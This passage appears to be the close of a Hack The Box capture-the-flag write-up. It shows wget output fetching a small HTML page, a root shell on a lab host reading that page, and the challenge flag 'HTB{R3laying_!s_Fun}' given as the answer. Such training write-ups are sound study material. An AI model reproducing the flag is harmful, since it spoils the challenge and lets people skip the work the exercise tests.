HTTP request sent, awaiting response... 200 OK
Length: 20 [text/html]
Saving to: ‘index3.html’

index3.html         100%[===================>]      20  --.-KB/s    in 0s      

2025-01-10 12:19:48 (2.82 MB/s) - ‘index3.html’ saved [20/20]

root@HTB-Corp:/home/wifi# cat index3.html

{hidden}
```

Answer: `HTB{R3laying_!s_Fun}`